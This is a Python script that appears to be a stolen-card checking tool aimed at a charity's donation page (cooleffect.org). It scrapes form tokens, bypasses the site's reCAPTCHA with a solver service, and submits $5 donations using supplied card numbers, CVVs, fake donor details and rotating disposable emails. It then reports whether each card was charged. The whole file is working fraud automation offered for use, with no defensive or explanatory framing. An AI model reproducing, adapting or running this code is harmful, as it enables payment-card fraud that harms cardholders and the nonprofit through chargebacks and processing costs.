import requests
import secrets
import random
from capsolv import solve_recaptcha
def getstr( data, first, last ):
    try: 
        start = data.index( first ) + len( first ) 
        end = data.index( last, start ) 
        return data[start:end] 
    except ValueError: 
        return None
def choose_email():
    email_pairs = [
        ('narragansett@gmailbrt.com', '870262e8-aced-4c4f-aebe-9fc530356e97'),
        ('johnnyboyrude@mrdmn.online', '1404efc1-6f1b-4b11-a329-a8207889444b'),
        ('johngang95@remaild.com', 'a616254f-5c63-4334-9ac7-211f79b42e2b'),
        ('r.o.p.enh.ar.to@gmail.com', '6458bd0b-af4c-451a-b7bd-81bbc9da6a7f'),
        ('har.a.d.ev.i.er@gmail.com', '9e2181cb-6f3a-42b4-9b3e-84e21f1f4dd9')
    ]
    
    return random.choice(email_pairs)

async def b3_charge3(cc,mm, yy,cvv):
    correct_id = secrets.token_hex(16)
    r = requests.session()
    email , verify_uuid = choose_email()
    
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': 'pageviewCount=1; _fbp=fb.1.1734962300833.741753505784726794; _ga_MWKNBP3GLN=GS1.1.1734962300.1.0.1734962300.60.0.0; _ga=GA1.1.48680435.1734962301; XSRF-TOKEN=eyJpdiI6IkFsYW5aVTRtMW1VdWtDRWp1THc1N3c9PSIsInZhbHVlIjoidzFzVDFrMnBoUTNHWmZ6Qlhkbm04ZzhXL0NDdVNlNDUwYTFuRWVZcU9lSytiTStubUw4MWlQL1I1Q3N3WlZ0RnBtV1VuQ3pDOWlRQWhNYnMxMlluU3ZaMEF6QVVienJiYkMwa0tha0RTb1BvTmpsc0Y2NTV4dEczaXRlcXNpR0siLCJtYWMiOiJjNzk2NDBlYzZkNGUxYTIwYWY3ZTkzNmE5Y2VlNmZlYmI3YzliNmVjMWVmYjQzMTYyNjkzNjM0NmI3ZjFiOGM5IiwidGFnIjoiIn0%3D; laravel_session=0rDDJEVuG34T0CT5ElHLcvwEvQveaElLhQEPdcvi',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
}
    try:
        response = r.get('https://www.cooleffect.org/store/donate', headers=headers)
        _token = getstr(response.text, 'name="_token" value="', '"')
        sub_uuid = getstr(response.text, 'subscription_order_uuid" value="', '"')
    except:
        return "Error in 1st request"
    
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '_fbp=fb.1.1734962300833.741753505784726794; _ga=GA1.1.48680435.1734962301; landingPage=; pageviewCount=2; _ga_MWKNBP3GLN=GS1.1.1734962300.1.1.1734962331.29.0.0; XSRF-TOKEN=eyJpdiI6IkpRYk5SUFJRSEREdHA0MFlpT2R4ZUE9PSIsInZhbHVlIjoiOExLcXlGemdaVkNaUWZZb0xTU0lnOS9SdzB6NUZlL1RrYUxoQWg1aXpYWW9YZVFjZGxjTWFRTW45N3Zud1pLVWpZUk1kQ0dpVC9uaFptdWtuRmhoSU0wT1VDTTN5c29VUzJUdVE3ZHlYa25oYjJTY3Z4S1d1aUVBakxvUm5DdGoiLCJtYWMiOiIxMDhjZWUzMzRkODA5YzM3ODU1ZjEwNGI0M2ExMTU5YmQwNjAzZGU3YzQ5ZTQxZDg5ZjM5NDdkMDMxYjc5NzRhIiwidGFnIjoiIn0%3D; laravel_session=2h3dP6vgwpKR2Gc7CsSP5iFpQtSNrpjD6pwPyJI5',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.cooleffect.org/store/donate',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
    try:
        response = r.get('https://www.cooleffect.org/store/api/get-terms-accept-token', headers=headers)
        accept_token = response.json()['donationToken']
    except:
        return "Error in 2nd request"
    try:
        sol = await solve_recaptcha("https://www.cooleffect.org/store/donate", "6LdqjsAZAAAAAKltkh1l7l6mBEEh7zX9lDsM0L6_")
    except:
        return "Error in Captcha"

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_fbp=fb.1.1734962300833.741753505784726794; _ga=GA1.1.48680435.1734962301; landingPage=; pageviewCount=2; _ga_MWKNBP3GLN=GS1.1.1734962300.1.1.1734962331.29.0.0; donationToken=950e41a9-d5c4-4144-b600-18522c1f9dd1; XSRF-TOKEN=eyJpdiI6InFrakI3RjlGZTZLNFkrRk1WUnV1cXc9PSIsInZhbHVlIjoiSklncW1HUGJSREszNnJyUitLWGRIR1Q0SjRUVlczNXZNRVFkREdtR1l1WXFvVkZoUy9uZUdYbmZmcjFoMks5TGlUd05BcmRGTkNiemZUSW9WeEdDLzlqN0JFM1ViUXA2blpGT3d5Tm81TmFPMEFrbVV4R3JHNW9GakI0UG0xVDAiLCJtYWMiOiIxZmJmNWE3ZjkwOTQzMWJlZWZmYTE4ZGNhN2QyYWY4Zjk2YzRhMjY1MTFmYzJmMGUwYjkzNGM2NGU0NTVjNDRjIiwidGFnIjoiIn0%3D; laravel_session=wh4NLPoXLuoWHMfeI8odqNA5ZBkPjIvPPSZCFRb0',
    'origin': 'https://www.cooleffect.org',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.cooleffect.org/store/donate',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
}

    data = {
    '_token': _token,
    'payment_method': 'credit_card',
    'donation_type': 'one-time',
    'subscription_order_uuid': sub_uuid,
    'amount': '5',
    'email_verification_uuid': verify_uuid,
    'braintree_payment_devicedata': '{"correlation_id":"'+correct_id+'"}',
    'email_verification_required': 'false',
    'other_amount': '5.00',
    'first_name': 'Albedo',
    'last_name': 'Jones',
    'email': email,
    'email_confirm': email,
    'phone': '85624 63578',
    'on_behalf_of': 'myself',
    'business_name': '',
    'memory_first_name': '',
    'memory_last_name': '',
    'memory_message': '',
    'memory_recipients': '',
    'address_1': 'New York',
    'address_2': '',
    'city': 'New York',
    'state': 'NY',
    'postcode': '10080',
    'country': 'US',
    'card_number': cc,
    'expire_date': mm+ '/'+ yy,
    'cvv': cvv,
    'terms_and_conditions': '1',
    'g-recaptcha-response': sol,
    'acceptance_token': accept_token,
    }
    try:
        response = r.post('https://www.cooleffect.org/store/donate', headers=headers, data=data)
        resp = getstr(response.text, 'role="alert" class="alert alert-danger mt-3">', '</div>')
        if resp:
            return resp
        else:
            try:
                if 'Thank you for your donation!' in response.text or 'Thank you' in response.text or 'Your donation has been processed' in response.text\
                    or 'Your donation processed successfully' in response.text or 'Thank you for your donation' in response.text or 'Success' in response.text:
                    return "Charged $5"
            except:
                if 'Thank you for your donation!' in response.text or 'Thank you' in response.text or 'Your donation has been processed' in response.text\
                    or 'Your donation processed successfully' in response.text or 'Thank you for your donation' in response.text:
                    return "Charged $5"
                else:
                    open('error.html', 'w').write(response.text)
                    return "Unknown Error"
    except:
        return "Error in Last request"
    
    
    
    
